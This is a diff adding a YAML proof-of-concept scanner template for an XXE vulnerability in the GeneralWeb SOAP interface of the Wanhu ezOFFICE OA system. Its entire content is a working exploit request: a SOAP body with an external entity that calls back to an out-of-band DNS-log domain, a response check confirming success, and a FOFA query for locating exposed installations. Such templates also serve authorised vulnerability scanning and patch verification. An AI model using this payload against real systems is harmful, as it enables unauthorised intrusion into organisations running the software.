@@ -1,0 +1,44 @@
+id: poc-yaml-wanhu-ezoffice-generalweb-xxe
+info:
+  name: 万户OA系统接口GeneralWeb存在XXE漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /defaultroot/xfservices/./GeneralWeb
+  headers:
+    Content-Type: text/xml;charset=UTF-8
+    SOAPAction: null
+  data: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:gen=\"http://com.whir.service/GeneralWeb\">\n  <soapenv:Body>\n    <gen:OAManager>\n\
+    \      <gen:input>\n        <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n     \
+    \   <!DOCTYPE root [\n        <!ENTITY x SYSTEM \"http://{{.reverseDomain}}.\"\
+    >]>\n        <root>&x;</root>\n      </gen:input>\n    </gen:OAManager>\n  </soapenv:Body>\n\
+    </soapenv:Envelope>"
+  expression: 'status_code == 500 &&
+
+    ((
+
+    contains(body,"<faultstring>") &&
+
+    reverse.Verify()
+
+    ) || (
+
+    contains(body,"<faultstring>") &&
+
+    contains(body,"<faultcode>") &&
+
+    contains(body,"for url:")
+
+    ))
+
+    '
+transport: http
